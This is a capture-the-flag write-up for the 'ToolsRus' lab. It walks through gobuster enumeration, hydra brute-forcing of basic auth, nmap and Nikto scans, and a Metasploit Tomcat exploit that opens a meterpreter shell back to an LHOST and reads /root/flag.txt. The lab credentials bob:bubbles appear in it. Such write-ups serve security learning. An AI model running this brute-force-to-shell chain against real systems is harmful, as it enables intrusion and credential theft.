# ToolsRus

![](<../../.gitbook/assets/Screenshot from 2020-09-09 09-18-23.png>)

### **What directory can you find, that begins with a "g"?**

```
gobuster -u http://10.10.199.79 \
         -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt \
         -t64
```

![](<../../.gitbook/assets/Screenshot from 2020-09-09 09-29-26.png>)

### Whose name can you find from this directory?

```
curl http://10.10.199.79/guidelines/
```

![](<../../.gitbook/assets/Screenshot from 2020-09-09 09-25-25.png>)

### What directory has basic authentication?

{% hint style="success" %}
protected
{% endhint %}

### What is bob's password to the protected part of the website?

```
hydra -l bob -P /usr/share/metasploit-framework/data/wordlists/password.lst \
      http-get://10.10.199.79/protected -f -V -t64
```

![](<../../.gitbook/assets/Screenshot from 2020-09-09 09-50-42.png>)

### What other port that serves a webs service is open on the machine?

```
nmap -sV -p1234,8009 10.10.199.79
```

![](<../../.gitbook/assets/Screenshot from 2020-09-09 10-00-02.png>)

### Going to the service running on that port, what is the name and version of the software?

![](<../../.gitbook/assets/Screenshot from 2020-09-09 10-01-40.png>)

### Use Nikto with the credentials you have found and scan the /manager/html directory on the port found above. How many documentation files did Nikto identify?

```
hikto -h http://10.10.199.79:1234/manager/html -id bob:bubbles
```

![](<../../.gitbook/assets/Screenshot from 2020-09-09 13-29-38.png>)

### What is the server version (run the scan against port 80)?

```
nmap -sV -p80 10.10.199.79
```

![](<../../.gitbook/assets/Screenshot from 2020-09-09 10-30-09.png>)

### **What version of Apache-Coyote is this service using?**

![](<../../.gitbook/assets/Screenshot from 2020-09-09 13-33-34.png>)

### What user did you get a shell as?

```
msfconsole -q
msf5 > search type:exploit tomcat
msf5 > use 8
msf5 > options
msf5 > set RHOST 10.10.199.79
msf5 > set RPORT 1234
msf5 > set HttpUsername bob
msf5 > set HttpPassword bubbles
msf5 > set LHOST 10.9.101.193
msf5 > exploit
meterpreter > getuid
```

![](<../../.gitbook/assets/Screenshot from 2020-09-09 11-58-51.png>)

### What text is in the file /root/flag.txt

```
meterpreter > cat /root/flag.txt
```
